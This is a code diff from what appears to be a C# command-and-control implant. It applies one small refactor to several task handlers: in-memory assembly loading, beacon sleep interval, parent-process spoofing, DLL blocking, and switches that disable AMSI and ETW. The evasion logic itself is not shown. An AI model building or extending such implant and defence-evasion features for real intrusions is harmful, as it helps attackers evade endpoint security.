@@ -73,7 +73,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);
 
                 var currentDomain = AppDomain.CurrentDomain;
@@ -105,7 +105,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
 
                 var interval = parameters.FirstOrDefault(p => p.Name.Equals("Interval", StringComparison.OrdinalIgnoreCase)).Value;
 
@@ -131,7 +131,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var ppid = parameters.FirstOrDefault(p => p.Name.Equals("PPID", StringComparison.OrdinalIgnoreCase)).Value;
 
                 Process process;
@@ -159,7 +159,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var block = parameters.FirstOrDefault(p => p.Name.Equals("BlockDLLs", StringComparison.OrdinalIgnoreCase)).Value;
 
                 bool current;
@@ -201,7 +201,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var disable = parameters.FirstOrDefault(p => p.Name.Equals("DisableAMSI", StringComparison.OrdinalIgnoreCase)).Value;
 
                 bool current;
@@ -243,7 +243,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var disable = parameters.FirstOrDefault(p => p.Name.Equals("DisableETW", StringComparison.OrdinalIgnoreCase)).Value;
 
                 bool current;
